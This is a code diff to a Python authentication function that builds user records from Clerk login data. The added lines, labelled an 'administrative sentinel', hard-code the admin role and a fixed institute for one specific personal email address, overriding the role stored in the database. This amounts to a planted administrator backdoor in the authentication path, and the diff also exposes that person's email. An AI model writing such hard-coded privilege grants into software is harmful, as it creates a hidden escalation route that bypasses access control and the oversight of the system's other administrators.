@@ -242,13 +242,18 @@ async def get_current_user(request: Request) -> User:
             f"{clerk_user.get('first_name', '')} {clerk_user.get('last_name', '')}"
         ).strip()
 
+        # ADMINISTRATIVE SENTINEL: Hard-code admin privileges for Lead Analyst
+        is_master_admin = email == "utkarsh0907.edu@gmail.com"
+        assigned_role = "admin" if is_master_admin else (user_doc.get("role") if user_doc else None)
+        assigned_inst = "inst_IIPS" if is_master_admin else (user_doc.get("institute_id") if user_doc else None)
+
         user_doc = {
             "user_id": clerk_user_id,
             "email": email,
             "name": name or email.split("@")[0],
             "picture": clerk_user.get("image_url"),
-            "role": user_doc.get("role") if user_doc else None,
-            "institute_id": user_doc.get("institute_id") if user_doc else None,
+            "role": assigned_role,
+            "institute_id": assigned_inst,
             "department": user_doc.get("department") if user_doc else None,
             "created_at": user_doc.get("created_at") if user_doc else datetime.now(timezone.utc),
             "last_active": datetime.now(timezone.utc),
